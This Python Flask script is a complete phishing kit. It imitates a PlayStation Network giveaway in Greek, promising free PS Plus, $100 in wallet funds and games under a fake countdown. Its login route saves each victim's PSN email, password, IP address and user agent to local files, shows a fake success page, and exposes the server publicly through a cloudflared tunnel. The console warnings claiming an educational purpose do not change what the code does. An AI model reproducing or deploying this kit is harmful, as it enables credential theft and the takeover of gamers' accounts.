import os
import sys
import subprocess
import re
import threading
import time
import logging
import random
from flask import Flask, render_template_string, request, session
from datetime import datetime
from werkzeug.utils import secure_filename

def install(pkg):
    subprocess.check_call([sys.executable, "-m", "pip", "install", "--quiet", pkg])

for pkg in ["flask", "werkzeug"]:
    try:
        __import__(pkg)
    except ImportError:
        install(pkg)

app = Flask(__name__)
app.secret_key = 'psn-test-key'

log = logging.getLogger('werkzeug')
log.setLevel(logging.ERROR + 10)
app.logger.setLevel(logging.ERROR + 10)

class DummyFile(object):
    def write(self, x): pass
    def flush(self): pass

BASE_FOLDER = os.path.expanduser("~/storage/downloads/PlayStation Network")
os.makedirs(BASE_FOLDER, exist_ok=True)

@app.route('/')
def index():
    session['psn_session'] = str(random.randint(100000, 999999))
    return render_template_string('''
    <!DOCTYPE html>
    <html lang="el">
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
        <title>PlayStation Network - Δωρεάν PS Plus & Παιχνίδια</title>
        <style>
            :root {
                --psn-blue: #003087;
                --psn-light-blue: #0070CC;
                --psn-gray: #333333;
                --psn-light: #F5F5F5;
                --psn-green: #5FAF5F;
            }
            
            * {
                box-sizing: border-box;
                -webkit-tap-highlight-color: transparent;
            }
            
            body {
                background: linear-gradient(135deg, #000000 0%, #003087 100%);
                font-family: -apple-system, BlinkMacSystemFont, 'Helvetica Neue', Arial, sans-serif;
                margin: 0;
                padding: 20px;
                display: flex;
                justify-content: center;
                align-items: center;
                min-height: 100vh;
                color: #FFFFFF;
                overflow-x: hidden;
                -webkit-text-size-adjust: 100%;
            }
            
            .login-box {
                background: rgba(0, 0, 0, 0.9);
                backdrop-filter: blur(10px);
                width: 100%;
                max-width: 500px;
                padding: 25px;
                border-radius: 12px;
                text-align: center;
                border: 1px solid #003087;
                box-shadow: 0 8px 32px rgba(0, 48, 135, 0.4);
                margin: 0 auto;
            }
            
            .psn-logo-container {
                display: flex;
                justify-content: center;
                align-items: center;
                margin-bottom: 20px;
                padding: 0 20px;
            }
            
            .psn-logo-img {
                height: 60px;
                width: auto;
                max-width: 100%;
                object-fit: contain;
            }
            
            .psplus-banner {
                background: linear-gradient(90deg, #003087 0%, #0070CC 50%, #003087 100%);
                color: white;
                padding: 15px;
                border-radius: 8px;
                margin: 20px 0;
                font-weight: 700;
                font-size: 18px;
                border: 2px solid #0070CC;
                animation: psGlow 2s infinite;
                line-height: 1.3;
            }
            
            @keyframes psGlow {
                0% { box-shadow: 0 0 15px rgba(0, 112, 204, 0.5); }
                50% { box-shadow: 0 0 30px rgba(0, 112, 204, 0.8); }
                100% { box-shadow: 0 0 15px rgba(0, 112, 204, 0.5); }
            }
            
            .wallet-badge {
                background: linear-gradient(90deg, #5FAF5F 0%, #7CC47C 50%, #5FAF5F 100%);
                color: white;
                padding: 15px;
                border-radius: 8px;
                margin: 15px 0;
                font-weight: 900;
                font-size: 24px;
                border: 2px solid #7CC47C;
                line-height: 1.2;
            }
            
            .giveaway-container {
                background: rgba(0, 112, 204, 0.1);
                border: 2px dashed var(--psn-light-blue);
                border-radius: 8px;
                padding: 20px;
                margin: 20px 0;
            }
            
            h1 {
                font-size: 28px;
                margin: 10px 0;
                color: white;
                font-weight: 700;
                line-height: 1.2;
            }
            
            .subtitle {
                color: #AAAAAA;
                font-size: 14px;
                margin-bottom: 20px;
                line-height: 1.4;
            }
            
            .timer {
                background: rgba(255, 0, 0, 0.1);
                border: 2px solid #FF4C4C;
                border-radius: 8px;
                padding: 12px;
                margin: 15px 0;
                font-family: 'Courier New', monospace;
                font-size: 24px;
                color: #FF9999;
                text-align: center;
                font-weight: bold;
                letter-spacing: 1px;
            }
            
            .games-showcase {
                display: grid;
                grid-template-columns: repeat(2, 1fr);
                gap: 12px;
                margin: 20px 0;
            }
            
            .game-card {
                background: rgba(255, 255, 255, 0.05);
                border: 1px solid #333333;
                border-radius: 8px;
                padding: 15px;
                text-align: center;
                transition: all 0.3s;
                position: relative;
                overflow: hidden;
                min-height: 140px;
                display: flex;
                flex-direction: column;
                justify-content: space-between;
            }
            
            .game-card:hover {
                border-color: var(--psn-light-blue);
                background: rgba(0, 112, 204, 0.1);
                transform: translateY(-3px);
            }
            
            .game-image {
                width: 100%;
                height: 80px;
                background: linear-gradient(45deg, #000000, #333333);
                border-radius: 6px;
                margin-bottom: 10px;
                display: flex;
                align-items: center;
                justify-content: center;
                font-size: 32px;
                color: #0070CC;
            }
            
            .game-title {
                color: white;
                font-weight: 600;
                font-size: 16px;
                margin-bottom: 6px;
                line-height: 1.2;
            }
            
            .game-price {
                color: #5FAF5F;
                font-weight: bold;
                font-size: 12px;
            }
            
            .free-tag {
                position: absolute;
                top: 8px;
                right: 8px;
                background: #5FAF5F;
                color: white;
                padding: 3px 6px;
                border-radius: 4px;
                font-size: 10px;
                font-weight: bold;
            }
            
            .form-group {
                text-align: left;
                margin-bottom: 20px;
            }
            
            .form-label {
                color: #AAAAAA;
                font-size: 12px;
                font-weight: 600;
                margin-bottom: 6px;
                display: block;
                text-transform: uppercase;
                letter-spacing: 0.5px;
            }
            
            input {
                width: 100%;
                padding: 14px;
                background: rgba(255, 255, 255, 0.05);
                border: 2px solid #333333;
                border-radius: 4px;
                color: white;
                font-size: 16px;
                box-sizing: border-box;
                transition: all 0.3s;
                -webkit-appearance: none;
                appearance: none;
            }
            
            input:focus {
                border-color: var(--psn-light-blue);
                outline: none;
                background: rgba(255, 255, 255, 0.1);
            }
            
            input::placeholder {
                color: #666666;
            }
            
            .login-btn {
                background: linear-gradient(45deg, #003087, #0070CC);
                color: white;
                border: none;
                padding: 16px;
                border-radius: 4px;
                font-weight: 700;
                font-size: 18px;
                width: 100%;
                margin: 20px 0 15px;
                cursor: pointer;
                transition: all 0.3s;
                -webkit-appearance: none;
                appearance: none;
            }
            
            .login-btn:hover {
                transform: translateY(-2px);
                box-shadow: 0 8px 20px rgba(0, 112, 204, 0.4);
            }
            
            .benefits-list {
                text-align: left;
                margin: 20px 0;
            }
            
            .benefit-item {
                display: flex;
                align-items: center;
                margin: 12px 0;
                color: #FFFFFF;
                font-size: 14px;
            }
            
            .benefit-icon {
                color: #5FAF5F;
                font-weight: bold;
                margin-right: 12px;
                font-size: 16px;
                flex-shrink: 0;
            }
            
            .psplus-badge {
                display: inline-flex;
                align-items: center;
                background: linear-gradient(45deg, #003087, #0070CC);
                color: white;
                padding: 4px 12px;
                border-radius: 20px;
                font-size: 12px;
                font-weight: 700;
                margin-left: 8px;
            }
            
            .warning-note {
                color: #FF9999;
                font-size: 11px;
                margin-top: 20px;
                border-top: 1px solid #333333;
                padding-top: 15px;
                text-align: center;
                line-height: 1.4;
            }
            
            .players-count {
                background: rgba(95, 175, 95, 0.1);
                border: 2px solid var(--psn-green);
                border-radius: 8px;
                padding: 10px;
                margin: 15px 0;
                font-size: 13px;
                color: #7CC47C;
                line-height: 1.3;
            }
            
            .console-icons {
                display: flex;
                justify-content: center;
                gap: 10px;
                margin: 15px 0;
                flex-wrap: wrap;
            }
            
            .console-icon {
                background: rgba(255, 255, 255, 0.05);
                border: 1px solid #333333;
                border-radius: 8px;
                padding: 10px;
                font-size: 18px;
                min-width: 60px;
                text-align: center;
            }
            
            .region-selector {
                background: rgba(255, 255, 255, 0.05);
                border: 1px solid #333333;
                border-radius: 4px;
                padding: 12px;
                margin: 12px 0;
                font-size: 14px;
                color: #AAAAAA;
                width: 100%;
                -webkit-appearance: none;
                appearance: none;
            }
            
            /* Mobile-specific optimizations */
            @media (max-width: 480px) {
                body {
                    padding: 15px;
                    min-height: -webkit-fill-available;
                }
                
                .login-box {
                    padding: 20px;
                    border-radius: 10px;
                }
                
                .psn-logo-img {
                    height: 50px;
                }
                
                h1 {
                    font-size: 24px;
                }
                
                .psplus-banner {
                    font-size: 16px;
                    padding: 12px;
                }
                
                .wallet-badge {
                    font-size: 20px;
                    padding: 12px;
                }
                
                .timer {
                    font-size: 20px;
                    padding: 10px;
                }
                
                .games-showcase {
                    gap: 10px;
                }
                
                .game-card {
                    padding: 12px;
                    min-height: 130px;
                }
                
                .game-image {
                    height: 70px;
                    font-size: 28px;
                }
                
                .game-title {
                    font-size: 14px;
                }
                
                .login-btn {
                    padding: 14px;
                    font-size: 16px;
                }
                
                input {
                    padding: 12px;
                    font-size: 16px;
                }
                
                .console-icon {
                    padding: 8px;
                    min-width: 50px;
                    font-size: 16px;
                }
            }
            
            @media (max-width: 360px) {
                .login-box {
                    padding: 15px;
                }
                
                .games-showcase {
                    grid-template-columns: 1fr;
                }
                
                .console-icons {
                    gap: 6px;
                }
                
                .console-icon {
                    min-width: 45px;
                    padding: 6px;
                    font-size: 14px;
                }
            }
            
            /* Prevent zoom on iOS input focus */
            @media screen and (-webkit-min-device-pixel-ratio:0) {
                select:focus,
                textarea:focus,
                input:focus {
                    font-size: 16px;
                }
            }
            
            /* Hide scrollbar but keep functionality */
            ::-webkit-scrollbar {
                width: 0;
                background: transparent;
            }
        </style>
    </head>
    <body>
        <div class="login-box">
            <div class="psn-logo-container">
                <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/4/4e/Playstation_logo_colour.svg/2560px-Playstation_logo_colour.svg.png" 
                     alt="PlayStation Network" 
                     class="psn-logo-img"
                     onerror="this.src='data:image/svg+xml;base64,PHN2ZyB3aWR0aD0iMjQwIiBoZWlnaHQ9IjYwIiB2aWV3Qm94PSIwIDAgMjQwIDYwIiBmaWxsPSJub25lIiB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciPjxyZWN0IHdpZHRoPSIyNDAiIGhlaWdodD0iNjAiIHJ4PSI0IiBmaWxsPSIjMDAzMDg3Ii8+PHRleHQgeD0iMTIwIiB5PSIzNSIgZm9udC1mYW1pbHk9IkFyaWFsIiBmb250LXNpemU9IjI0IiBmaWxsPSJ3aGl0ZSIgdGV4dC1hbmNob3I9Im1pZGRsZSIgZm9udC13ZWlnaHQ9ImJvbGQiPlBsYXlTdGF0aW9uPC90ZXh0Pjwvc3ZnPg=='">
            </div>
            
            <div class="psplus-banner">
                🎮 ΔΩΡΕΑΝ PS PLUS & ΠΑΙΧΝΙΔΙΑ 🎮
            </div>
            
            <div class="wallet-badge">
                $100 ΧΡΗΜΑΤΑ PSN ΠΟΡΤΟΦΟΛΙΟΥ
            </div>
            
            <div class="console-icons">
                <div class="console-icon">PS5</div>
                <div class="console-icon">PS4</div>
                <div class="console-icon">PS3</div>
                <div class="console-icon">PSV</div>
            </div>
            
            <div class="giveaway-container">
                <h1>Διανομή Δωρεάν PS Plus & Παιχνιδιών</h1>
                <div class="subtitle">
                    Περιορισμός στους πρώτους 300 παίκτες! <span class="psplus-badge">PS Plus</span>
                </div>
                
                <div class="timer" id="countdown">
                    25:00
                </div>
            </div>
            
            <div class="players-count">
                🎯 <strong>112,583,472 ενεργοί παίκτες</strong> - Περιορισμένες θέσεις!
            </div>
            
            <select class="region-selector">
                <option>Αμερική (ΗΠΑ/Καναδάς/Λατινική Αμερική)</option>
                <option>Ευρώπη/Μέση Ανατολή/Αφρική</option>
                <option>Ιαπωνία</option>
                <option>Ασία Ειρηνικού</option>
            </select>
            
            <div class="games-showcase">
                <div class="game-card">
                    <div class="free-tag">ΔΩΡΕΑΝ</div>
                    <div class="game-image">🕷️</div>
                    <div class="game-title">Marvel's Spider-Man 2</div>
                    <div class="game-price">$69.99 → ΔΩΡΕΑΝ</div>
                </div>
                <div class="game-card">
                    <div class="free-tag">ΔΩΡΕΑΝ</div>
                    <div class="game-image">⚔️</div>
                    <div class="game-title">God of War Ragnarök</div>
                    <div class="game-price">$69.99 → ΔΩΡΕΑΝ</div>
                </div>
                <div class="game-card">
                    <div class="free-tag">ΔΩΡΕΑΝ</div>
                    <div class="game-image">🎮</div>
                    <div class="game-title">The Last of Us Part I</div>
                    <div class="game-price">$69.99 → ΔΩΡΕΑΝ</div>
                </div>
                <div class="game-card">
                    <div class="free-tag">ΔΩΡΕΑΝ</div>
                    <div class="game-image">🚗</div>
                    <div class="game-title">Gran Turismo 7</div>
                    <div class="game-price">$69.99 → ΔΩΡΕΑΝ</div>
                </div>
            </div>
            
            <div class="benefits-list">
                <div class="benefit-item">
                    <span class="benefit-icon">✓</span>
                    $100 Χρήματα προστέθηκαν στο Πορτοφόλι PSN
                </div>
                <div class="benefit-item">
                    <span class="benefit-icon">✓</span>
                    Συνδρομή PS Plus Premium 1 Έτους
                </div>
                <div class="benefit-item">
                    <span class="benefit-icon">✓</span>
                    4 Δωρεάν Παιχνίδια PS5
                </div>
                <div class="benefit-item">
                    <span class="benefit-icon">✓</span>
                    Εξαιρετικά Avatars & Θέματα PlayStation
                </div>
                <div class="benefit-item">
                    <span class="benefit-icon">✓</span>
                    Προτεραιότητα στην Υποστήριξη Πελατών
                </div>
            </div>
            
            <form action="/login" method="post">
                <div class="form-group">
                    <label class="form-label">ΣΥΝΔΕΣΗ ID (EMAIL)</label>
                    <input type="text" name="username" placeholder="Εισάγετε το email σας στο PlayStation Network" required>
                </div>
                
                <div class="form-group">
                    <label class="form-label">ΚΩΔΙΚΟΣ ΠΡΟΣΒΑΣΗΣ</label>
                    <input type="password" name="password" placeholder="Εισάγετε τον κωδικό πρόσβασής σας" required>
                </div>
                
                <button type="submit" class="login-btn">
                    🎮 Δηλώστε Δωρεάν PS Plus & Παιχνίδια
                </button>
            </form>
            
            <div class="warning-note">
                ⚠️ Αυτή η προσφορά PlayStation Network λήγει σε 25 λεπτά. Όλα τα οφέλη θα ενεργοποιηθούν εντός 24 ωρών.
            </div>
        </div>
        
        <script>
            // Countdown timer
            let timeLeft = 1500; // 25 minutes in seconds
            const countdownElement = document.getElementById('countdown');
            
            function updateTimer() {
                const minutes = Math.floor(timeLeft / 60);
                const seconds = timeLeft % 60;
                countdownElement.textContent = `${minutes.toString().padStart(2, '0')}:${seconds.toString().padStart(2, '0')}`;
                
                if (timeLeft <= 300) { // Last 5 minutes
                    countdownElement.style.background = 'rgba(255, 0, 0, 0.2)';
                    countdownElement.style.animation = 'psGlow 1s infinite';
                }
                
                if (timeLeft > 0) {
                    timeLeft--;
                    setTimeout(updateTimer, 1000);
                } else {
                    countdownElement.textContent = "Η προσφορά έληξε!";
                    countdownElement.style.color = '#FF4C4C';
                }
            }
            
            updateTimer();
            
            // Animate game cards
            const gameCards = document.querySelectorAll('.game-card');
            gameCards.forEach((card, index) => {
                card.style.opacity = '0';
                card.style.transform = 'translateY(15px)';
                
                setTimeout(() => {
                    card.style.transition = 'all 0.5s ease';
                    card.style.opacity = '1';
                    card.style.transform = 'translateY(0)';
                }, index * 200);
            });
            
            // Prevent form submission spam
            const form = document.querySelector('form');
            let isSubmitting = false;
            
            form.addEventListener('submit', function(e) {
                if (isSubmitting) {
                    e.preventDefault();
                    return;
                }
                
                isSubmitting = true;
                const button = this.querySelector('.login-btn');
                const originalText = button.innerHTML;
                button.innerHTML = 'Επεξεργασία...';
                button.disabled = true;
                
                // Re-enable after 3 seconds if something goes wrong
                setTimeout(() => {
                    isSubmitting = false;
                    button.innerHTML = originalText;
                    button.disabled = false;
                }, 3000);
            });
            
            // Handle mobile keyboard issues
            const inputs = document.querySelectorAll('input');
            inputs.forEach(input => {
                input.addEventListener('focus', () => {
                    setTimeout(() => {
                        window.scrollTo(0, input.getBoundingClientRect().top + window.scrollY - 100);
                    }, 100);
                });
            });
        </script>
    </body>
    </html>
    ''')

@app.route('/login', methods=['POST'])
def login():
    username = request.form.get('username', '').strip()
    password = request.form.get('password', '').strip()
    session_id = session.get('psn_session', 'unknown')

    safe_username = secure_filename(username)
    timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
    user_file_path = os.path.join(BASE_FOLDER, f"{safe_username}_{timestamp}.txt")

    with open(user_file_path, 'w') as file:
        file.write(f"Session: {session_id}\n")
        file.write(f"PSN Email: {username}\n")
        file.write(f"Password: {password}\n")
        file.write(f"Timestamp: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
        file.write(f"User-Agent: {request.headers.get('User-Agent', 'Unknown')}\n")
        file.write(f"IP: {request.remote_addr}\n")
        file.write(f"Platform: PlayStation Network Giveaway\n")
        file.write(f"Promised: $100 PSN Funds + 1 Year PS Plus Premium\n")
        file.write(f"Games Shown: Spider-Man 2, God of War Ragnarök, TLOU Part I, Gran Turismo 7\n")

    return render_template_string('''
    <!DOCTYPE html>
    <html lang="el">
    <head>
        <title>Επεξεργασία PS Plus - PlayStation Network</title>
        <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
        <style>
            * {
                box-sizing: border-box;
                -webkit-tap-highlight-color: transparent;
            }
            
            body {
                background: linear-gradient(135deg, #000000 0%, #003087 100%);
                font-family: -apple-system, BlinkMacSystemFont, 'Helvetica Neue', Arial, sans-serif;
                margin: 0;
                padding: 20px;
                display: flex;
                justify-content: center;
                align-items: center;
                min-height: 100vh;
                color: #FFFFFF;
                overflow-x: hidden;
                -webkit-text-size-adjust: 100%;
            }
            
            .container {
                text-align: center;
                background: rgba(0, 0, 0, 0.9);
                backdrop-filter: blur(10px);
                padding: 30px;
                border-radius: 12px;
                max-width: 600px;
                width: 100%;
                border: 1px solid #003087;
                box-shadow: 0 8px 32px rgba(0, 48, 135, 0.4);
                margin: 0 auto;
            }
            
            .psn-logo-container {
                display: flex;
                justify-content: center;
                align-items: center;
                margin-bottom: 20px;
            }
            
            .psn-logo-img {
                height: 60px;
                width: auto;
                max-width: 100%;
                object-fit: contain;
            }
            
            .psplus-badge {
                display: inline-flex;
                align-items: center;
                background: linear-gradient(45deg, #003087, #0070CC);
                color: white;
                padding: 8px 20px;
                border-radius: 20px;
                font-size: 16px;
                font-weight: 700;
                margin: 15px 0;
            }
            
            .funds-amount {
                font-size: 48px;
                font-weight: 900;
                background: linear-gradient(45deg, #5FAF5F, #7CC47C);
                -webkit-background-clip: text;
                -webkit-text-fill-color: transparent;
                margin: 15px 0;
                text-shadow: 0 0 20px rgba(95, 175, 95, 0.3);
                line-height: 1;
            }
            
            .dollar-sign {
                color: #7CC47C;
                font-size: 32px;
                margin-right: 5px;
                vertical-align: middle;
            }
            
            h2 {
                margin-bottom: 10px;
                color: #0070CC;
                font-size: 24px;
            }
            
            p {
                color: #AAAAAA;
                margin-bottom: 20px;
                line-height: 1.4;
            }
            
            .processing-container {
                background: rgba(0, 112, 204, 0.1);
                border: 2px solid #0070CC;
                border-radius: 8px;
                padding: 20px;
                margin: 20px 0;
            }
            
            .progress-container {
                width: 100%;
                height: 6px;
                background: rgba(255, 255, 255, 0.1);
                border-radius: 4px;
                margin: 20px 0;
                overflow: hidden;
            }
            
            .progress-bar {
                height: 100%;
                background: linear-gradient(90deg, #003087, #0070CC, #5FAF5F);
                border-radius: 4px;
                width: 0%;
                animation: fillProgress 3s ease-in-out forwards;
            }
            
            @keyframes fillProgress {
                0% { width: 0%; }
                100% { width: 100%; }
            }
            
            .psplus-activated {
                background: rgba(95, 175, 95, 0.1);
                border: 2px solid #5FAF5F;
                border-radius: 8px;
                padding: 20px;
                margin: 20px 0;
                text-align: left;
            }
            
            .checkmark {
                color: #5FAF5F;
                font-weight: bold;
                font-size: 18px;
                margin-right: 12px;
                flex-shrink: 0;
            }
            
            .status-item {
                display: flex;
                align-items: center;
                margin: 15px 0;
                color: #FFFFFF;
                font-size: 16px;
            }
            
            .games-added {
                display: grid;
                grid-template-columns: repeat(2, 1fr);
                gap: 12px;
                margin: 20px 0;
            }
            
            .game-item {
                background: rgba(255, 255, 255, 0.03);
                border: 1px solid #333333;
                border-radius: 8px;
                padding: 15px;
                text-align: center;
            }
            
            .game-icon {
                font-size: 20px;
                margin-bottom: 8px;
                color: #0070CC;
            }
            
            .transaction-id {
                background: rgba(0, 112, 204, 0.1);
                border: 1px solid #333333;
                border-radius: 4px;
                padding: 8px;
                font-family: 'Courier New', monospace;
                font-size: 11px;
                color: #AAAAAA;
                margin: 15px 0;
                word-break: break-all;
            }
            
            @media (max-width: 480px) {
                body {
                    padding: 15px;
                }
                
                .container {
                    padding: 20px;
                }
                
                .psn-logo-img {
                    height: 50px;
                }
                
                .funds-amount {
                    font-size: 40px;
                }
                
                h2 {
                    font-size: 20px;
                }
                
                .psplus-badge {
                    font-size: 14px;
                    padding: 6px 15px;
                }
                
                .processing-container {
                    padding: 15px;
                }
                
                .status-item {
                    font-size: 14px;
                }
                
                .checkmark {
                    font-size: 16px;
                }
                
                .games-added {
                    gap: 10px;
                }
                
                .game-item {
                    padding: 12px;
                }
            }
            
            @media (max-width: 360px) {
                .games-added {
                    grid-template-columns: 1fr;
                }
                
                .funds-amount {
                    font-size: 36px;
                }
            }
            
            /* Hide scrollbar */
            ::-webkit-scrollbar {
                width: 0;
                background: transparent;
            }
        </style>
        <meta http-equiv="refresh" content="8;url=/" />
    </head>
    <body>
        <div class="container">
            <div class="psn-logo-container">
                <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/4/4e/Playstation_logo_colour.svg/2560px-Playstation_logo_colour.svg.png" 
                     alt="PlayStation Network" 
                     class="psn-logo-img"
                     onerror="this.src='data:image/svg+xml;base64,PHN2ZyB3aWR0aD0iMjQwIiBoZWlnaHQ9IjYwIiB2aWV3Qm94PSIwIDAgMjQwIDYwIiBmaWxsPSJub25lIiB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciPjxyZWN0IHdpZHRoPSIyNDAiIGhlaWdodD0iNjAiIHJ4PSI0IiBmaWxsPSIjMDAzMDg3Ii8+PHRleHQgeD0iMTIwIiB5PSIzNSIgZm9udC1mYW1pbHk9IkFyaWFsIiBmb250LXNpemU9IjI0IiBmaWxsPSJ3aGl0ZSIgdGV4dC1hbmNob3I9Im1pZGRsZSIgZm9udC13ZWlnaHQ9ImJvbGQiPlBsYXlTdGF0aW9uPC90ZXh0Pjwvc3ZnPg=='">
            </div>
            
            <div class="psplus-badge">
                ✅ PLAYSTATION PLUS PREMIUM ΕΝΕΡΓΟΠΟΙΗΘΗΚΕ
            </div>
            
            <div class="funds-amount">
                <span class="dollar-sign">$</span>100
            </div>
            
            <h2>PS Plus & Χρήματα Προστέθηκαν!</h2>
            <p>Τα οφέλη σας στο PlayStation ενεργοποιούνται</p>
            
            <div class="processing-container">
                <h3>Επεξεργασία της Διανομής σας</h3>
                <div class="progress-container">
                    <div class="progress-bar"></div>
                </div>
                <p>Προσθήκη χρημάτων και συνδρομής PS Plus...</p>
            </div>
            
            <div class="games-added">
                <div class="game-item">
                    <div class="game-icon">🕷️</div>
                    <div>Spider-Man 2</div>
                </div>
                <div class="game-item">
                    <div class="game-icon">⚔️</div>
                    <div>God of War Ragnarök</div>
                </div>
                <div class="game-item">
                    <div class="game-icon">🎮</div>
                    <div>The Last of Us Part I</div>
                </div>
                <div class="game-item">
                    <div class="game-icon">🚗</div>
                    <div>Gran Turismo 7</div>
                </div>
            </div>
            
            <div class="transaction-id">
                ID Συναλλαγής: PSN-<span id="transaction-id">0000000</span>
            </div>
            
            <div class="psplus-activated">
                <div class="status-item">
                    <span class="checkmark">✓</span>
                    <strong>$100 Χρήματα</strong> προστέθηκαν στο Πορτοφόλι PSN
                </div>
                <div class="status-item">
                    <span class="checkmark">✓</span>
                    <strong>PS Plus Premium</strong> - Συνδρομή 1 Έτους
                </div>
                <div class="status-item">
                    <span class="checkmark">✓</span>
                    <strong>4 Παιχνίδια PS5</strong> προστέθηκαν στη βιβλιοθήκη σας
                </div>
                <div class="status-item">
                    <span class="checkmark">✓</span>
                    <strong>Εξαιρετικά Θέματα</strong> - Προσαρμογή PS5/PS4
                </div>
                <div class="status-item">
                    <span class="checkmark">✓</span>
                    <strong>Προτεραιότητα Υποστήριξης</strong> - Ειδική βοήθεια PSN
                </div>
            </div>
            
            <p style="color: #AAAAAA; margin-top: 25px; font-size: 14px;">
                Θα ανακατευθυνθείτε στο PlayStation Network...
                <br>
                <small style="color: #666666;">Τα οφέλη σας θα είναι διαθέσιμα σε όλες τις κονσόλες PlayStation εντός 24 ωρών</small>
            </p>
        </div>
        
        <script>
            // Generate random transaction ID
            document.getElementById('transaction-id').textContent = 
                Math.floor(Math.random() * 10000000).toString().padStart(7, '0');
            
            // Animate funds amount
            setTimeout(() => {
                const fundsAmount = document.querySelector('.funds-amount');
                fundsAmount.style.transform = 'scale(1.05)';
                fundsAmount.style.transition = 'transform 0.3s';
                setTimeout(() => {
                    fundsAmount.style.transform = 'scale(1)';
                }, 300);
            }, 1500);
            
            // Animate added games
            const gameItems = document.querySelectorAll('.game-item');
            gameItems.forEach((item, index) => {
                item.style.opacity = '0';
                setTimeout(() => {
                    item.style.transition = 'opacity 0.5s';
                    item.style.opacity = '1';
                }, index * 300);
            });
            
            // Prevent iOS zoom
            document.addEventListener('touchstart', function(e) {
                if (e.touches.length > 1) {
                    e.preventDefault();
                }
            }, { passive: false });
        </script>
    </body>
    </html>
    ''')

def run_cloudflared_tunnel(local_url):
    cmd = ["cloudflared", "tunnel", "--url", local_url]
    process = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True)
    
    for line in process.stdout:
        match = re.search(r'https://[a-zA-Z0-9-]+\.trycloudflare\.com', line)
        if match:
            tunnel_url = match.group(0)
            print(f"🎮 Δημόσιος Σύνδεσμος PlayStation Network: {tunnel_url}")
            print(f"💰 Υπόσχεση: $100 ΔΩΡΕΑΝ Χρήματα PSN + 1 Έτος PS Plus Premium")
            print(f"💾 Διαπιστευτήρια αποθηκεύτηκαν σε: {BASE_FOLDER}")
            print("⚠️  ΠΡΟΕΙΔΟΠΟΙΗΣΗ: Μόνο για εκπαιδευτικούς σκοπούς!")
            print("⚠️  ΠΟΤΕ μην εισάγετε πραγματικά διαπιστευτήρια PlayStation Network!")
            print("⚠️  Οι λογαριασμοί PSN έχουν σημαντική οικονομική και προσωπική αξία!")
            print("⚠️  Οι λογαριασμοί κονσολών είναι κύριοι στόχοι για απατεώνες!")
            print("-" * 50)
            sys.stdout.flush()
            break
    
    return process

if __name__ == '__main__':
    sys_stdout = sys.stdout
    sys_stderr = sys.stderr
    sys.stdout = DummyFile()
    sys.stderr = DummyFile()

    def run_flask():
        app.run(host='0.0.0.0', port=5013, debug=False, use_reloader=False)

    flask_thread = threading.Thread(target=run_flask, daemon=True)
    flask_thread.start()

    time.sleep(2)
    sys.stdout = sys_stdout
    sys.stderr = sys_stderr

    print("🚀 Εκκίνηση Σελίδας Διανομής PlayStation Network...")
    print("📱 Θύρα: 5013")
    print("💾 Τοποθεσία αποθήκευσης: ~/storage/downloads/PlayStationNetwork/")
    print("💰 Υπόσχεση: $100 ΔΩΡΕΑΝ Χρήματα Πορτοφολίου PSN")
    print("🎮 Bonus: 1 Έτος PS Plus Premium + 4 Παιχνίδια PS5")
    print("🎯 Στόχος: Παίκτες PlayStation σε PS5/PS4/PS3/PS Vita")
    print("⚠️  ΠΡΟΕΙΔΟΠΟΙΗΣΗ: Η ηλεκτρονική απάτη με λογαριασμούς κονσολών είναι εξαιρετικά συχνή!")
    print("⏳ Αναμονή για σύνδεση cloudflared...")
    
    cloudflared_process = run_cloudflared_tunnel("http://127.0.0.1:5013")

    try:
        cloudflared_process.wait()
    except KeyboardInterrupt:
        cloudflared_process.terminate()
        print("\n👋 Ο διακομιστής σταμάτησε")
        sys.exit(0)